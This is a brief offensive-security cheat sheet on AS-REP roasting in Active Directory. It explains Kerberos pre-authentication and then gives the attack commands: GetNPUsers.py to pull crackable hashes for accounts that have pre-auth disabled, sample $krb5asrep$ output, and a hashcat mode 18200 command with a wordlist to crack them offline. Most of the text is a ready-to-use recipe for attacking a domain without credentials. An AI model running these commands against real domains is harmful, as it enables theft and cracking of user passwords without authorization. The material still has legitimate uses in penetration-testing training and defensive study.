AS-REP ROAST NO CRED NEEDED
PRE-AUTH: ON vs OFF
PRE-AUTH ON ✓
AS-REQ must include timestamp encrypted with user's key. KDC verifies you know the password before giving TGT.
PRE-AUTH OFF ⚠
KDC returns AS-REP encrypted with user's hash — no auth needed! Hash is crackable offline.
ATTACK — NO CRED REQUIRED
# Find users with pre-auth disabled
GetNPUsers.py domain/ -usersfile users.txt -dc-ip 10.0.0.1
# Output:
$krb5asrep$23$bob@DOMAIN:a3f0...
# Crack:
hashcat -m 18200 asrep.txt rockyou.txt
